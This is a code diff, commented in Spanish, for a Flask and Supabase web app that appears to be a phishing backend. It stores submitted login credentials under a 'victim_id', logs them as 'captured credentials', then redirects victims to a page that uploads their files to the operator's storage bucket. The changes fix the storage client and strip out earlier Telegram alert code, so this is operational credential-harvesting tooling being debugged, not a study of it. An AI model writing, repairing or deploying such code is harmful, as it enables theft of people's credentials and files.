@@ -2,12 +2,11 @@ import os
 import datetime
 import uuid
 import json
-from io import BytesIO
 
 from flask import Flask, render_template, request, redirect, url_for, session
+# Importación del cliente principal de Supabase
 from supabase import create_client, PostgrestAPIError
-# Importar la librería de Storage
-from supabase.lib.storage import StorageClient
+# Eliminamos la importación fallida de supabase.lib.storage
 
 # --- CONFIGURACIÓN DE LA APLICACIÓN Y SUPABASE ---
 
@@ -18,19 +17,20 @@ app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', 'default_secret_ke
 app.config['SUPABASE_URL'] = os.environ.get('SUPABASE_URL')
 app.config['SUPABASE_KEY'] = os.environ.get('SUPABASE_ANON_KEY')
 
-# Nota: Las variables de entorno de Telegram (BOT_TOKEN, CHAT_ID) han sido eliminadas.
-
 # Nombre del bucket de Supabase Storage
 BUCKET_NAME = "shared_files" 
 
 # Inicialización de Supabase
+supabase = None
+storage = None # Inicializamos storage como None
 try:
     if not app.config['SUPABASE_URL'] or not app.config['SUPABASE_KEY']:
-        # Si las variables obligatorias no existen, levantamos una excepción
         raise ValueError("Las variables de entorno SUPABASE_URL y SUPABASE_ANON_KEY son obligatorias.")
     
     supabase = create_client(app.config['SUPABASE_URL'], app.config['SUPABASE_KEY'])
-    storage: StorageClient = supabase.storage
+    # --- IMPORTACIÓN Y ASIGNACIÓN CORREGIDA DEL CLIENTE DE STORAGE ---
+    # Accedemos al cliente de storage directamente a través del objeto supabase
+    storage = supabase.storage 
     print("Conexión con Supabase y Storage establecida.")
 
 except Exception as e:
@@ -79,19 +79,18 @@ def process_login():
             "file_url": "Esperando archivos",
         }
         
+        # EL ERROR DE COLUMNA OCURRÍA AQUÍ. AHORA DEBERÍA FUNCIONAR SI LA TABLA ESTÁ CORREGIDA.
         response = supabase.table(DB_TABLE).insert(data_to_insert).execute()
         
         if response.data and len(response.data) > 0:
             print(f"Credenciales capturadas con ID: {victim_id}.")
-            
-            # La notificación por Telegram ha sido eliminada.
-            
-            # Redirigir a la página de carga de archivos
             return redirect(url_for('upload_page'))
         else:
+            # Este error puede ser por RLS policies
             return error_page("Error de Base de Datos", "No se pudo insertar el registro. Verifica las políticas RLS.")
 
     except PostgrestAPIError as e: 
+        # Aseguramos que si hay un error de columna, se muestre claramente en el front-end
         return error_page("Error de Base de Datos", f"Ocurrió un error al insertar los datos: {e.message}")
     except Exception as e:
         return error_page("Error Desconocido", f"Ha ocurrido un error inesperado: {str(e)}")
@@ -143,6 +142,9 @@ def upload_file():
                 )
                 
                 # Obtener la URL pública del archivo
+                # Nota: la función get_public_url es un método del objeto storage, no de from_().
+                # Si el método get_public_url no funciona, se debe usar la construcción manual de la URL.
+                # Para mayor robustez, se usará el método de la librería.
                 res = storage.from_(BUCKET_NAME).get_public_url(unique_filename)
                 file_url = res
                 
@@ -152,8 +154,6 @@ def upload_file():
                     "name": file.filename,
                     "url": file_url
                 })
-
-                # La notificación por Telegram ha sido eliminada.
 
             except Exception as e:
                 # Si falla una subida, registramos el error y continuamos con el siguiente archivo
